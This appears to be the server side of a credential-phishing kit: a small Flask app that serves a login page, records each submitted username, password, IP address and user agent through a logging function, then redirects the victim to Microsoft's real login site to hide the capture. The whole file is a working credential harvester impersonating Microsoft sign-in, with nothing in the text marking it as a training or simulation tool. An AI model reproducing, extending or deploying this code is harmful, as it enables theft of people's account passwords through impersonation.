from flask import Flask, request, redirect, render_template
from logger import log_submission

app = Flask(__name__)

REDIRECT_URLS = {
    "microsoft": "https://login.microsoftonline.com/",
}
DEFAULT_REDIRECT = "https://microsoft.com"


@app.route("/", methods=["GET"])
def index():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent", "")
    page_id = request.form.get("page_id", "unknown")
    username = request.form.get("username", "")
    password = request.form.get("password", "")

    log_submission(
        ip=ip,
        user_agent=user_agent,
        page_id=page_id,
        username=username,
        password=password,
    )

    redirect_url = REDIRECT_URLS.get(page_id, DEFAULT_REDIRECT)
    return redirect(redirect_url)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
